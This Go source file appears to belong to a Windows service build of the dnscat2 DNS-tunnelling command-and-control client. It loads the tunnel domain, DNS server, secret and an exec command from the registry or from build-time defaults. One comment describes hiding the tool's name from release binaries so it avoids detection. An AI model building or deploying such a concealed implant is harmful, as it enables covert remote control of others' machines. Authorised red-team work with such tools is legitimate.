//go:build windows

package main

import (
	"fmt"
	"strconv"

	"golang.org/x/sys/windows/registry"
)

// registryPath is derived from DefaultServiceName so the literal "dnscat2"
// never appears in a release binary — it is whatever ldflags sets the name to.
var registryPath = `SYSTEM\CurrentControlSet\Services\` + DefaultServiceName + `\Parameters`

// Build-time configurable defaults (set via -ldflags)
var (
	DefaultDomain        = ""
	DefaultDnsServer     = ""
	DefaultDnsPort       = "53"
	DefaultDnsTypes      = "TXT,CNAME,MX"
	DefaultSecret        = ""
	DefaultExecCommand   = ""
	DefaultDelay         = "1000"
	DefaultMaxRetransmit = "20"
	DefaultNoEncryption  = "false"
	DefaultPacketTrace   = "false"
)

type Config struct {
	Domain        string
	DnsServer     string
	DnsPort       uint
	DnsTypes      string
	Secret        string
	NoEncryption  bool
	Delay         int
	MaxRetransmit int
	PacketTrace   bool
	ExecCommand   string
}

// LoadConfigFromRegistry loads service configuration from the registry key at
// registryPath, falling back to build-time ldflags defaults when the key is absent.
func LoadConfigFromRegistry() (*Config, error) {
	config := getDefaultConfig()

	k, err := registry.OpenKey(registry.LOCAL_MACHINE, registryPath, registry.QUERY_VALUE)
	if err != nil {
		if config.Domain != "" || config.DnsServer != "" {
			return config, nil
		}
		return nil, fmt.Errorf("no registry config and no build-time defaults: %w", err)
	}
	defer k.Close()

	if v, _, err := k.GetStringValue("Domain"); err == nil && v != "" {
		config.Domain = v
	}
	if v, _, err := k.GetStringValue("DnsServer"); err == nil && v != "" {
		config.DnsServer = v
	}
	if v, _, err := k.GetStringValue("DnsTypes"); err == nil && v != "" {
		config.DnsTypes = v
	}
	if v, _, err := k.GetStringValue("Secret"); err == nil && v != "" {
		config.Secret = v
	}
	if v, _, err := k.GetStringValue("ExecCommand"); err == nil && v != "" {
		config.ExecCommand = v
	}
	if v, _, err := k.GetIntegerValue("DnsPort"); err == nil {
		config.DnsPort = uint(v)
	}
	if v, _, err := k.GetIntegerValue("Delay"); err == nil {
		config.Delay = int(v)
	}
	if v, _, err := k.GetIntegerValue("MaxRetransmit"); err == nil {
		config.MaxRetransmit = int(v)
	}
	if v, _, err := k.GetIntegerValue("NoEncryption"); err == nil {
		config.NoEncryption = v != 0
	}
	if v, _, err := k.GetIntegerValue("PacketTrace"); err == nil {
		config.PacketTrace = v != 0
	}

	if config.Domain == "" && config.DnsServer == "" {
		return nil, fmt.Errorf("Domain or DnsServer must be set")
	}

	return config, nil
}

func getDefaultConfig() *Config {
	config := &Config{
		Domain:       DefaultDomain,
		DnsServer:    DefaultDnsServer,
		DnsTypes:     DefaultDnsTypes,
		Secret:       DefaultSecret,
		ExecCommand:  DefaultExecCommand,
		NoEncryption: DefaultNoEncryption == "true",
		PacketTrace:  DefaultPacketTrace == "true",
	}

	if port, err := strconv.ParseUint(DefaultDnsPort, 10, 32); err == nil {
		config.DnsPort = uint(port)
	} else {
		config.DnsPort = 53
	}
	if delay, err := strconv.Atoi(DefaultDelay); err == nil {
		config.Delay = delay
	} else {
		config.Delay = 1000
	}
	if maxRetrans, err := strconv.Atoi(DefaultMaxRetransmit); err == nil {
		config.MaxRetransmit = maxRetrans
	} else {
		config.MaxRetransmit = 20
	}

	return config
}
